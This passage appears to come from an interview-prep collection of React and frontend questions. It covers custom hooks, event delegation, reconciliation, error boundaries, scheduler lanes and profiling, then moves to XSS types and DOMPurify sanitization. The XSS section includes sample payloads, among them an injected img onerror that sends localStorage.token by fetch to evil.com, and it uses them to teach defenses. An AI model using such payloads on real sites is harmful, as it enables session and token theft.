    const [entry, setEntry] = useState<IntersectionObserverEntry | null>(null);
    const frozen = entry?.isIntersecting && freezeOnceVisible;

    useEffect(() => {
        const node = elementRef?.current;
        if (!node || frozen || typeof IntersectionObserver === 'undefined') return;

        const observer = new IntersectionObserver(([firstEntry]) => {
            setEntry(firstEntry);
        }, { threshold, root, rootMargin });

        observer.observe(node);

        // Cleanup: disconnect observer when target node changes or component unmounts
        return () => {
            observer.disconnect();
        };
    }, [elementRef, threshold, root, rootMargin, frozen]);

    return entry;
}
```

**Performance Features:**
- **`freezeOnceVisible`:** For image lazy-loading, once an image enters the viewport (`isIntersecting === true`), the observer is disconnected permanently, preventing redundant re-renders when the user scrolls past it again.
- **`rootMargin` pre-fetching:** Setting `rootMargin: '200px'` triggers pagination or image loading 200px *before* the sentinel element reaches the viewport edge, creating a seamless infinite scroll experience.

## Why

IntersectionObserver offloads visibility detection to browser layout threads, avoiding main-thread scroll event bottlenecks.

## Worked Case

Walkthrough scenario: An infinite feed binds a window scroll listener with getBoundingClientRect() to check if the user reached the bottom. On low-end mobile devices, rapid scrolling triggers continuous forced synchronous reflows, dropping frame rates to 15fps. Refactoring to useIntersectionObserver on a sentinel div at the list bottom eliminates scroll event handlers entirely; the browser asynchronously notifies the hook when the sentinel appears, maintaining a steady 60fps.

## Risk

Failing to disconnect the observer on unmount leads to orphaned DOM element retainment and memory leaks.

## Trade-off

Intersection checks run asynchronously on the next animation frame, making them unsuitable for synchronous zero-frame layout locking.

## Try This

Attach useIntersectionObserver to a sentinel div at the bottom of a list to trigger fetchNextPage() when entry.isIntersecting is true.

## Follow-ups

### How do you observe multiple elements without instantiating hundreds of IntersectionObserver instances?

Maintain a singleton IntersectionObserver in a module-level map, registering individual DOM nodes and their respective callbacks.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API
- https://react.dev/reference/react/useEffect

# How do you build an accessible useClickOutside custom hook to dismiss modals and dropdowns without event race conditions?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A `useClickOutside` custom hook detects pointer interactions occurring outside a referenced container element to dismiss dropdown menus, dialogs, and popovers. Building a resilient version requires listening to `pointerdown` (or `mousedown`) rather than `click`, and carefully verifying DOM node containment while ignoring clicks on trigger elements.

```typescript
import { useEffect, useRef } from 'react';

export function useClickOutside<T extends HTMLElement>(
    handler: (event: MouseEvent | TouchEvent) => void
): React.RefObject<T | null> {
    const containerRef = useRef<T>(null);
    const savedHandler = useRef(handler);
    savedHandler.current = handler; // Avoid handler re-subscription

    useEffect(() => {
        const listener = (event: MouseEvent | TouchEvent) => {
            const target = event.target as Node | null;
            // Do nothing if container does not exist or click occurred inside container
            if (!containerRef.current || containerRef.current.contains(target)) {
                return;
            }
            savedHandler.current(event);
        };

        // Use pointerdown to capture initial touch/mouse press before focus switches
        document.addEventListener('mousedown', listener);
        document.addEventListener('touchstart', listener);

        return () => {
            document.removeEventListener('mousedown', listener);
            document.removeEventListener('touchstart', listener);
        };
    }, []);

    return containerRef;
}
```

**Race Condition Defenses:**
- **`mousedown` vs `click`:** If you listen to `click`, dragging text inside a modal and releasing the mouse outside it will trigger a `click` event on the body, prematurely closing the modal. Listening to `mousedown` accurately records where the gesture originated.
- **Portal containment:** When components render into React Portals outside the root container, `containerRef.current.contains(target)` evaluates to `false` for portal children unless the portal node is also explicitly checked.

## Why

useClickOutside handles modal dismissal by detecting when gestures originate outside the component container.

## Worked Case

Walkthrough scenario: A user opens a dropdown menu and tries to select text inside an input field in the dropdown. As the user drags the selection cursor, the mouse button is released outside the dropdown boundary. A naive click listener interprets this as a click outside and unmounts the dropdown, wiping the user's input. Using mousedown with node containment checks ensures the gesture that started inside does not close the dropdown.

## Risk

Listening to click instead of mousedown causes modal closure when users release a text selection drag outside modal bounds.

## Trade-off

Global document event listeners run on every click on the page, requiring fast early-exit containment checks.

## Try This

Attach useClickOutside to a dropdown menu and verify clicking inside keeps it open while clicking anywhere outside closes it.

## Follow-ups

### How do you prevent the click that opens the dropdown from immediately triggering the click-outside handler?

Ensure the toggle button click event does not bubble or check if event.target is contained within the toggle button ref.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Node/contains
- https://react.dev/learn/reusing-logic-with-custom-hooks

# How do you implement a useMediaQuery custom hook with SSR hydration safety and matchMedia listeners?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A `useMediaQuery` custom hook evaluates CSS media queries (e.g. `(min-width: 768px)`, `(prefers-color-scheme: dark)`) in JavaScript, re-rendering the component when the viewport or user preferences cross breakpoint thresholds. In SSR frameworks (Next.js, Remix), the server has no window or device viewport dimensions, so the hook must provide a predictable initial default to prevent hydration layout mismatches.

```typescript
import { useState, useEffect } from 'react';

export function useMediaQuery(query: string, defaultValue = false): boolean {
    const [matches, setMatches] = useState<boolean>(() => {
        if (typeof window === 'undefined') return defaultValue;
        return window.matchMedia(query).matches;
    });

    useEffect(() => {
        if (typeof window === 'undefined') return;
        const mediaQueryList = window.matchMedia(query);
        setMatches(mediaQueryList.matches);

        const listener = (event: MediaQueryListEvent) => {
            setMatches(event.matches);
        };

        // Modern EventTarget API on MediaQueryList
        mediaQueryList.addEventListener('change', listener);
        return () => {
            mediaQueryList.removeEventListener('change', listener);
        };
    }, [query]);

    return matches;
}
```

**Hydration Invariant:**
On the server, `defaultValue` is rendered into the HTML. If the client device has a different viewport on initial mount, the `useEffect` synchronizes the true client value *after* the initial hydration commit, avoiding a hydration markup mismatch error.

## Why

useMediaQuery lets components programmatically adapt to viewport and device preference changes without polling resize events.

## Worked Case

Walkthrough scenario: A responsive navigation bar renders a desktop menu or mobile hamburger. Using window.innerWidth < 768 on the server crashes with window is not defined. Using window.matchMedia on client initial state causes HTML from server (desktop) to mismatch client initial render on mobile (hamburger), causing React to dump the server DOM. Providing a default SSR fallback and syncing via useEffect allows clean hydration followed by a smooth single-pass layout update.

## Risk

Switching DOM trees during SSR hydration based on immediate window.innerWidth reads causes hydration mismatch errors.

## Trade-off

Using JavaScript media queries instead of CSS media queries (@media) causes a brief flash of default layout if values differ.

## Try This

Toggle device simulation mode in browser DevTools across 768px width and verify useMediaQuery updates without page reload.

## Follow-ups

### How can useSyncExternalStore be applied to useMediaQuery?

Pass mediaQueryList.addEventListener as subscribe and () => mediaQueryList.matches as getSnapshot for zero-lag concurrent reads.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Window/matchMedia
- https://react.dev/reference/react/useSyncExternalStore

# How does the useLatest or useEvent ref pattern eliminate stale closures in effects without triggering re-subscriptions?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A frequent architectural dilemma in React occurs when an effect needs to call a callback that reads fresh props or state, but adding that callback to the `useEffect` dependency array would cause the effect to unbind and re-bind expensive subscriptions (like WebSocket connections or event listeners) on every render. The `useLatest` pattern uses a mutable ref to hold the most recent callback, allowing effects to invoke the latest logic with stable dependencies.

```typescript
import { useRef, useLayoutEffect, useCallback } from 'react';

// 1. The useLatest hook:
export function useLatest<T>(value: T): React.RefObject<T> {
    const ref = useRef<T>(value);
    useLayoutEffect(() => {
        ref.current = value;
    });
    return ref;
}

// 2. The useEventCallback hook:
export function useEventCallback<T extends (...args: any[]) => any>(fn: T): T {
    const ref = useRef<T>(fn);
    useLayoutEffect(() => {
        ref.current = fn;
    });
    return useCallback(((...args: any[]) => {
        return ref.current(...args);
    }) as T, []);
}
```

**Why useLayoutEffect?**
Updating `ref.current` inside `useLayoutEffect` guarantees the ref is updated synchronously before any passive `useEffect` fires anywhere in the component tree, ensuring that background timers and subscriptions never invoke a stale function.

**Restriction:** Event callbacks generated this way should only be called inside effects or event handlers, never during render computation.

## Why

useLatest breaks the coupling between callback freshness and effect re-execution dependencies.

## Worked Case

Walkthrough scenario: A chat widget connects to a WebSocket in useEffect. Inside the onMessage handler, it calls onNewMessage(msg, currentRoomId). Because currentRoomId changes as the user navigates, adding onNewMessage to useEffect dependencies drops and re-establishes the WebSocket connection on every room change. Wrapping onNewMessage with useEventCallback provides a referentially stable callback that reads fresh currentRoomId without ever disconnecting the socket.

## Risk

Invoking an event callback created with useEventCallback during render computation reads uncommitted mutable state.

## Trade-off

Sacrifices purely declarative dependency tracking in exchange for stable subscription lifetimes.

## Try This

Create a timer interval effect that reads a fast-updating state counter using useLatest, verifying the interval timer ID never resets.

## Follow-ups

### Why is useLayoutEffect preferred over useEffect for updating ref.current in useLatest?

useLayoutEffect runs synchronously before browser paint, ensuring the ref is populated before any child or sibling useEffect executes.

## Citations

- https://react.dev/reference/react/useRef
- https://github.com/reactjs/rfcs/blob/useevent/text/0000-useevent.md

# How do React's synthetic event system and native DOM event delegation differ between React 16, 17, and 18?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React wraps browser native events in cross-browser `SyntheticEvent` instances for unified behavior across platforms. A monumental architectural shift occurred between React 16 and React 17/18 in how events are attached and delegated.

```
React 16 Delegation Architecture:
[ Document Node ] <--- All React event listeners attached here!
       |
[ App Root Container #root ]
       |
[ Target Button: <button onClick={...}> ]

React 17+ Delegation Architecture:
[ Document Node ]
       |
[ App Root Container #root ] <--- React listeners attached here per root!
       |
[ Target Button: <button onClick={...}> ]
```

**Crucial Differences:**
- **Attachment Point:** In React 16, React attached listeners to `document`. In React 17 and 18, React attaches listeners to the root DOM container (`rootNode`, e.g. `<div id="root">`). This allows multiple micro-frontend React apps to safely co-exist on the same page without cross-app event interference.
- **Event Pooling Removal:** In React 16, `SyntheticEvent` objects were pooled and wiped after the event callback executed (accessing `e.target` in an async `setTimeout` threw `null` unless `e.persist()` was called). In React 17+, event pooling was completely removed; synthetic event properties remain accessible in async code.
- **Propagation Order:** When mixing native `document.addEventListener` with React `onClick`, in React 16 native document listeners fired *after* React handlers. In React 17+, native document listeners fire *after* the event bubbles out of `#root`.

## Why

Root container delegation enables micro-frontend multi-version co-existence and aligns React event bubbling with native DOM order.

## Worked Case

Walkthrough scenario: A micro-frontend host running React 18 embeds a legacy React 16 checkout widget. In React 16, clicking inside the legacy widget bubbled to document, where both apps had global listeners that collided and broke dropdowns. With React 17+ root delegation, calling e.stopPropagation() inside the child micro-frontend stops the event at the child root boundary, preventing it from reaching the host root container cleanly.

## Risk

Calling e.stopPropagation() in a React 17+ handler stops bubbling to root, but native listeners on child DOM nodes still fire.

## Trade-off

Synthetics introduce an allocation wrapper layer in exchange for cross-browser normalization and consistent bubbling across portals.

## Try This

Attach a native click listener to document.body and a React onClick to a button, logging order to verify bubbling from root to document.

## Follow-ups

### Why was synthetic event pooling removed in React 17?

Modern JavaScript engines optimize small object allocations efficiently, making pooling benefits negligible compared to the async confusion it caused.

## Citations

- https://legacy.reactjs.org/blog/2020/08/10/react-v17-rc.html#changes-to-event-delegation
- https://react.dev/learn/responding-to-events

# Why does React StrictMode render components and invoke effects twice in development, and how do you write idempotent effects?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In development mode, `React.StrictMode` intentionally double-invokes component render functions, constructor functions, state updater functions, and effect setup/cleanup cycles (`mount -> unmount -> mount`). This is not a bug; it is an aggressive stress test designed to surface side-effects placed in pure render functions and prove that `useEffect` cleanups are fully idempotent.

```typescript
// VULNERABLE NON-IDEMPOTENT EFFECT (Broke in StrictMode):
useEffect(() => {
    // Missing cleanup! StrictMode mount -> unmount -> mount adds two listeners:
    window.addEventListener('resize', handleResize);
}, []);

// SECURE IDEMPOTENT EFFECT (Succeeds in StrictMode & Concurrent Mode):
useEffect(() => {
    window.addEventListener('resize', handleResize);
    // Cleanup restores system to pristine baseline:
    return () => {
        window.removeEventListener('resize', handleResize);
    };
}, []);
```

**Why Concurrent React requires this:**
React 18 introduces Fast Refresh and features like Offscreen (Activity), where React can hide a component, unmount its DOM and layout effects to save memory, and remount it later with preserved state. If your effect cannot survive an unmount/remount cycle without leaking sockets, timers, or duplicate DOM elements, it will fail in production concurrent scenarios.

## Why

Double-mounting in StrictMode verifies that components and effects can safely survive concurrent pauses, resumes, and tab unmounting.

## Worked Case

Walkthrough scenario: A developer connects to a chat room in useEffect without cleanup. In development with StrictMode, the user notices they receive every message twice. The developer thinks React has a bug, but StrictMode exposed that navigating away and back to the chat room would have leaked a persistent connection in production. Adding return () => socket.disconnect() ensures the first connection closes cleanly and only one active connection remains.

## Risk

Omitting cleanup handlers causes duplicate subscriptions, multiple network requests, and runaway memory leaks in development and production.

## Trade-off

Doubles initial development render and network calls, causing developer confusion unless intentional idempotency is understood.

## Try This

Add an AbortController to a fetch effect in StrictMode and verify the network tab aborts the first request cleanly and completes the second.

## Follow-ups

### Does StrictMode double-render in production builds?

No, StrictMode double-renders and double-invokes effects strictly in development mode; production builds mount exactly once.

## Citations

- https://react.dev/reference/react/StrictMode
- https://react.dev/learn/synchronizing-with-effects#how-to-handle-the-effect-firing-twice-in-development

# How do controlled and uncontrolled components differ in form state management, and how do you build a useControllableState hook?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A **controlled component** derives its form value directly from React props (`value={props.value}`) and notifies the parent of changes via a callback (`onChange={props.onChange}`), making React the single source of truth. An **uncontrolled component** stores its form value natively in the DOM (`defaultValue={props.defaultValue}`), queried imperatively via a `ref`.

High-grade UI component libraries (such as Radix UI and Headless UI) implement hybrid components that support *both* modes seamlessly using a `useControllableState` hook.

```typescript
import { useState, useCallback, useRef } from 'react';

export function useControllableState<T>({
    value: propValue,
    defaultValue,
    onChange
}: {
    value?: T;
    defaultValue: T;
    onChange?: (val: T) => void;
}): [T, (nextVal: T | ((prev: T) => T)) => void] {
    const isControlled = propValue !== undefined;
    const [uncontrolledState, setUncontrolledState] = useState<T>(defaultValue);
    const currentValue = isControlled ? propValue : uncontrolledState;

    const setValue = useCallback((next: T | ((prev: T) => T)) => {
        const resolved = next instanceof Function ? next(currentValue) : next;
        if (!isControlled) {
            setUncontrolledState(resolved);
        }
        onChange?.(resolved);
    }, [isControlled, currentValue, onChange]);

    return [currentValue, setValue];
}
```

**Critical Anti-Pattern:** A component must never switch from uncontrolled (`value=undefined`) to controlled (`value='text'`) mid-lifecycle. Doing so triggers React's warning: *'A component is changing an uncontrolled input to be controlled.'*

## Why

useControllableState allows design system components to support both frictionless drop-in uncontrolled use and strict parent-controlled state.

## Worked Case

Walkthrough scenario: A design system team builds an Accordion component. Consumer A wants quick drop-in usage without managing state: <Accordion defaultValue='item-1' />. Consumer B wants to synchronize the open accordion with a URL query parameter: <Accordion value={activeTab} onChange={setActiveTab} />. Implementing useControllableState allows the exact same Accordion component to serve both consumers flawlessly without duplicate implementations.

## Risk

Passing value={undefined} initially and later passing a string triggers React uncontrolled-to-controlled console errors.

## Trade-off

Controlled state incurs a re-render per keystroke; uncontrolled state eliminates typing lag on massive forms but complicates validation.

## Try This

Build a Switch toggle component with useControllableState that can operate standalone or controlled by a parent state variable.

## Follow-ups

### How do you avoid the uncontrolled-to-controlled warning when initializing controlled state from asynchronous data?

Provide a fallback value (e.g. value={data?.name ?? ''}) so the controlled input value is never passed as undefined.

## Citations

- https://react.dev/learn/sharing-state-between-components#controlled-and-uncontrolled-components

# What is the exact reconciliation behavior when swapping component types versus toggling reconciliation keys?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React's reconciliation diffing heuristic operates on two fundamental assumptions to achieve O(n) performance: 1. Two elements of different types produce entirely different subtrees. 2. Keys identify which child elements remain stable across different renders.

```tsx
// 1. Swapping Component Types: Completely destroys and remounts subtree
// When isEditing toggles between true and false:
{isEditing ? <EditProfileForm /> : <ViewProfileDisplay />}
// React unmounts ViewProfileDisplay (clearing DOM, refs, state) and mounts EditProfileForm.

// 2. Swapping Same Component Type with Same Key: Preserves internal state!
<Counter key="counter" />
// State is preserved even if surrounding props change.

// 3. Changing Key on Same Component Type: Forces complete teardown and re-initialization!
<UserProfile key={userId} userId={userId} />
```

**Strategic Use of Keys to Reset State:**
A common React bug is retaining old form state when switching selected users. Instead of writing complex `useEffect` cleanup functions to reset 10 different `useState` fields when `userId` changes, changing the reconciliation `key` (`key={userId}`) instructs React to tear down the old component Fiber and mount a fresh instance with clean default state automatically.

## Why

Keys determine component identity; changing keys signals React to discard previous state and re-initialize the subtree.

## Worked Case

Walkthrough scenario: A master-detail admin panel displays user profiles. User A has draft text in a bio input. The admin clicks User B in the sidebar. Because the UserProfile component did not change type and had no key, React kept the existing Fiber and preserved the draft bio state, accidentally saving User A's draft bio into User B's profile. Adding key={user.id} forces React to unmount User A and mount User B with fresh empty state, preventing data corruption.

## Risk

Using array indices as keys causes React to preserve old component state in the wrong items when list items are deleted or inserted.

## Trade-off

Tearing down a component via key change resets internal state cleanly but loses uncommitted scroll and focus positions.

## Try This

Render a stateful Form with a key={userId} prop; change userId and verify all input fields reset to initial defaults without useEffect.

## Follow-ups

### What happens if two sibling elements in an array share the exact same key?

React emits a console warning, and updates to the duplicate elements will improperly clobber and overwrite each other during diffing.

## Citations

- https://react.dev/learn/preserving-and-resetting-state

# Why do Error Boundaries require class components, and what specific categories of runtime errors can they not catch?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In React, Error Boundaries catch JavaScript errors anywhere in their child component tree during rendering, lifecycle methods, and constructor execution, logging the error and displaying a fallback UI instead of crashing the entire page. Error Boundaries *must* be implemented as class components because there are no hook equivalents for `componentDidCatch` or `static getDerivedStateFromError`.

```typescript
import React, { Component, ErrorInfo, ReactNode } from 'react';

interface Props { children: ReactNode; fallback: ReactNode; }
interface State { hasError: boolean; error: Error | null; }

export class ErrorBoundary extends Component<Props, State> {
    state: State = { hasError: false, error: null };

    // Synchronously update state to render fallback UI on next render:
    static getDerivedStateFromError(error: Error): State {
        return { hasError: true, error };
    }

    // Log error telemetry asynchronously:
    componentDidCatch(error: Error, errorInfo: ErrorInfo) {
        console.error('Captured by ErrorBoundary:', error, errorInfo.componentStack);
    }

    render() {
        if (this.state.hasError) return this.props.fallback;
        return this.props.children;
    }
}
```

**What Error Boundaries CANNOT catch:**
1. **Event Handlers:** Errors thrown inside `onClick` or `onSubmit` happen outside rendering. Catch these with standard `try/catch`.
2. **Asynchronous Callbacks:** Errors in `setTimeout`, `requestAnimationFrame`, or uncaught `Promise` rejections.
3. **Server-Side Rendering (SSR):** Errors occurring during server HTML rendering; SSR fails closed.
4. **Errors inside the Error Boundary itself:** An error boundary only catches errors in its *children*, not in its own render method.

## Why

Error boundaries isolate sub-tree crashes so a widget failure in a sidebar does not crash the entire web application.

## Worked Case

Walkthrough scenario: A user clicks a Buy button that throws an error inside an async fetch. The developer expected the ErrorBoundary surrounding the checkout form to catch it. Instead, the screen remained stuck with a spinning button because ErrorBoundaries do not catch event handler errors. Refactoring the event handler to try/catch with a local setError state allows the form to display an inline error message.

## Risk

Assuming error boundaries catch asynchronous event handler failures leaves unhandled promise rejections silent.

## Trade-off

Class components require older lifecycle syntax and cannot use hooks directly (though children can).

## Try This

Wrap a buggy component in an ErrorBoundary with a Retry button that resets state.hasError to false upon user click.

## Follow-ups

### How can an event handler pass an async error to the nearest Error Boundary?

Invoke a state setter with a function that throws: const [, setError] = useState(); setError(() => { throw error; });.

## Citations

- https://react.dev/reference/react/Component#catching-rendering-errors-with-an-error-boundary

# How does React prevent concurrent mode starvation across priority lanes, and how does lane expiration upgrade work?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In React 18's concurrent scheduler, units of work are assigned to **Lanes** represented as a 31-bit integer bitmask. High-priority lanes include `SyncLane` (discrete user gestures like clicks) and `InputContinuousLane` (typing and dragging), while low-priority lanes include `DefaultLane` (normal data fetching updates) and `TransitionLane` (background transitions).

```
Lane Priority Hierarchy (from highest to lowest):
SyncLane (1)                <-- Discrete clicks, keypresses
InputContinuousLane (2)     <-- Dragging, scroll tracking
DefaultLane (4)             <-- Normal state updates (fetch resolution)
TransitionLane (8...64)     <-- startTransition, useDeferredValue
IdleLane (1073741824)       <-- Offscreen rendering
```

**Preventing Starvation via Expiration:**
If a user continuously types at 120 words per minute, high-priority `SyncLane` tasks enter the queue incessantly. Without a starvation protection mechanism, low-priority `TransitionLane` renders would be deferred indefinitely and never commit.

- **Expiration Timestamp:** When a transition task is scheduled, React assigns it an expiration deadline (typically ~5000ms in the future).
- **Priority Upgrade:** On each scheduler tick, React checks if any pending task's deadline has passed. If expired, React immediately upgrades the task from `TransitionLane` to `SyncLane`, forcing it to render synchronously without yielding until committed.

## Why

Lane expiration ensures low-priority background transitions are guaranteed to complete even under continuous high-priority user interaction.

## Worked Case

Walkthrough scenario: A dashboard user types continuously into a filter box while a heavy 5000-row table re-renders in startTransition. Because keystrokes arrive every 50ms, React keeps interrupting the table render to process the keystroke. After 5000ms, the transition's expiration timer lapses. React marks the table render as expired, elevates it to Sync priority, completes the render synchronously, and commits the updated table to the screen, preventing indefinite starvation.

## Risk

Setting too short a transition timeout or heavy background computation causes UI stutters when expired tasks block the main thread.

## Trade-off

Bitmask lanes provide extremely fast 32-bit bitwise comparison and scheduling operations at the cost of framework internal complexity.

## Try This

Dispatch a rapid loop of urgent state updates while a transition is pending and observe in Profiler how the transition eventually forces completion.

## Follow-ups

### Why did React replace expiration times with bitmask lanes in React 17/18?

Lanes allow expressing multiple independent priority batches simultaneously using bitwise operators (lanes & -lanes), decoupling priority from sequence.

## Citations

- https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberLane.js
- https://react.dev/reference/react/useTransition

# How do you profile, identify, and eliminate unnecessary re-renders using the React DevTools Profiler and WhyDidYouRender?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Performance profiling in React requires empirical measurement rather than speculative memoization. The **React DevTools Profiler** records commit phases, measuring component render duration, commit counts, and why a specific component rendered.

```tsx
// 1. Profiler Component for programmatic telemetry:
import { Profiler, ProfilerOnRenderCallback } from 'react';

const onRender: ProfilerOnRenderCallback = (
    id, phase, actualDuration, baseDuration, startTime, commitTime
) => {
    if (actualDuration > 16) {
        console.warn(`[Slow Render] ${id} in ${phase} took ${actualDuration.toFixed(2)}ms`);
    }
};

export function MonitoredFeed() {
    return (
        <Profiler id="FeedList" onRender={onRender}>
            <LargeFeed />
        </Profiler>
    );
}
```

**Identifying Re-render Culprits:**
- **Flamegraph vs Ranked Chart:** The Flamegraph shows tree hierarchy with color-coded durations (yellow = expensive, blue = fast, gray = skipped). The Ranked Chart sorts components strictly by `actualDuration` to pinpoint bottlenecks.
- **'Why did this render?':** Enable 'Record why each component rendered while profiling' in DevTools settings. Common triggers: `props changed: onClick` (un-memoized inline callback) or `state changed`.
- **WhyDidYouRender library:** Automatically hooks into React to notify the console when a component wrapped in `React.memo` re-renders due to equal-by-value but unequal-by-reference props.

## Why

Systematic profiling prevents premature memoization while exposing real prop instability and render bottlenecks.

## Worked Case

Walkthrough scenario: A developer wrapped a 100-item TableRow component in React.memo, but noticed in Profiler that every row still re-rendered when a top-level counter changed. Hovering over TableRow in DevTools revealed: 'Props changed: (onDelete)'. The parent passed onDelete={() => deleteItem(item.id)} as an inline arrow function, generating a brand new reference on every render and defeating React.memo completely. Passing a stable useCallback or passing id to the child eliminated all 100 re-renders.

## Risk

Wrapping every component in React.memo and useMemo indiscriminately introduces memory overhead that exceeds the cost of re-rendering.

## Trade-off

The Profiler adds profiling overhead in development and requires specialized profiling production bundles to measure accurately in production.

## Try This

Enable 'Highlight updates when components render' in React DevTools and identify components that re-render without visual changes.

## Follow-ups

### What is the difference between actualDuration and baseDuration in the Profiler?

actualDuration is time spent rendering the current commit; baseDuration estimates how long the subtree would take without memoization.

## Citations

- https://react.dev/reference/react/Profiler
- https://legacy.reactjs.org/blog/2018/09/10/introducing-the-react-profiler.html

# What are the differences between Stored, Reflected, and DOM-based Cross-Site Scripting (XSS), and how is each exploited?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Cross-Site Scripting (XSS) occurs when malicious JavaScript executes in the context of an unsuspecting user's browser session. XSS falls into three distinct classifications based on how the malicious payload travels into the DOM execution sink:
1. **Stored XSS (Persistent):** The attacker stores the malicious payload in the application's backend database (e.g. in a comment, profile bio, or forum post). Whenever any user views that page, the server delivers the payload, executing the attacker's script in every visitor's browser.
2. **Reflected XSS (Non-Persistent):** The payload is embedded in a crafted URL (e.g., in a search query parameter `?q=<script>...`). When the victim clicks the phishing link, the backend reflects the unescaped parameter directly in the HTTP response HTML.
3. **DOM-based XSS (Client-Side):** The vulnerability exists entirely within client-side JavaScript. The server never sees the payload. Client scripts read data from an untrusted **Source** (e.g. `location.hash`, `location.search`, `document.referrer`) and write it into a dangerous execution **Sink** (e.g. `innerHTML`, `document.write`, `eval()`).

```typescript
// VULNERABLE TO DOM-BASED XSS:
// URL: https://app.example.com/#name=<img src=x onerror=alert(document.cookie)>
const hash = window.location.hash.slice(1);
const params = new URLSearchParams(hash);
const name = params.get('name') || '';
// Dangerous sink writes directly to HTML:
document.getElementById('greeting')!.innerHTML = `Hello, ${name}`; // EXPLOITED!

// SECURE IMPLEMENTATION:
// Safe sink escapes markup as literal text automatically:
document.getElementById('greeting')!.textContent = `Hello, ${name}`;
```

**Complexity analysis and mechanics:**
- **Impact:** Executed scripts inherit complete access to the origin's cookies (unless `HttpOnly`), `localStorage`, active session state, and can perform authenticated actions on behalf of the victim.
- **Modern frameworks:** React and Angular escape `{variables}` in JSX text nodes automatically, making standard text rendering safe from XSS by default.

**Algorithmic mechanics and edge cases:**
In React, DOM-based XSS still occurs if developers use `dangerouslySetInnerHTML`, attribute injection (e.g. `<a href={userWebsite}>` where `userWebsite = 'javascript:stealCredentials()'`!), or evaluate untrusted strings via `eval()`.

## Why

Understanding the three XSS vectors is mandatory to apply targeted sanitization, safe sinks, and CSP defenses.

## Worked Case

Walkthrough scenario: An application reads a theme color from the URL hash: const color = location.hash.slice(1); and injects it via document.body.innerHTML += "<div style=\"color:${color}\">...</div>". An attacker sends the victim a link: app.com/#"><img src=x onerror="fetch('https://evil.com?c='+localStorage.token)">. The browser parses the image tag, fails to load x, and fires onerror, exfiltrating the victim's JWT token to the attacker's server.

## Risk

A successful XSS attack grants the attacker full control over the user's browser session, session tokens, and account actions.

## Trade-off

TextContent prevents XSS completely but renders raw HTML markup as plain visible text strings.

## Try This

Test setting an element innerHTML vs textContent with an <img src=x onerror=console.log(1)> payload in the browser console.

## Follow-ups

### Why is <a href={url}> vulnerable to XSS in React even without dangerouslySetInnerHTML?

If url starts with 'javascript:', clicking the link executes the JavaScript payload in the browser with full page privileges.

## Citations

- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

# Why is innerHTML inherently dangerous, and how do you sanitize untrusted HTML safely using DOMPurify and Trusted Types?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `element.innerHTML` is the most dangerous sink in web browsers because it invokes the browser's full HTML parser on arbitrary strings. If the string contains user-controlled input, the parser executes inline scripts, inline event handlers (`onload`, `onerror`, `onfocus`), and dangerous elements (`<iframe>`, `<object>`, `<svg onload=...>`). When rich HTML must be rendered (e.g., rendering user-authored Markdown or rich-text comments), frontends must sanitize the markup using **DOMPurify** and enforce safe sinks using the browser's **Trusted Types API**.

```typescript
import DOMPurify from 'dompurify';

// 1. Safe HTML Sanitization with Strict Whitelists:
export function sanitizeUserHTML(untrustedMarkup: string): string {
    return DOMPurify.sanitize(untrustedMarkup, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],
        ALLOWED_ATTR: ['href', 'target', 'rel'],
        ALLOW_DATA_ATTR: false // Block custom data-attributes that can trigger client XSS
    });
}

// 2. Trusted Types Policy (Enforced at browser engine level):
if (window.trustedTypes) {
    const policy = window.trustedTypes.createPolicy('default', {
        createHTML: (string) => DOMPurify.sanitize(string)
    });
}

// In React:
function RichText({ content }: { content: string }) {
    const clean = sanitizeUserHTML(content);
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Complexity analysis and mechanics:**
- **DOMPurify sanitization:** Operates by parsing markup inside an isolated, inert DOM document (`DOMImplementation.createHTMLDocument`), traversing the DOM tree, and removing non-whitelisted elements and event attributes.
- **Trusted Types API:** When enabled via CSP (`require-trusted-types-for 'script'`), assigning a raw string to `innerHTML` or `document.write` throws a runtime `TypeError`, mathematically eliminating DOM XSS across the codebase.

**Algorithmic mechanics and edge cases:**
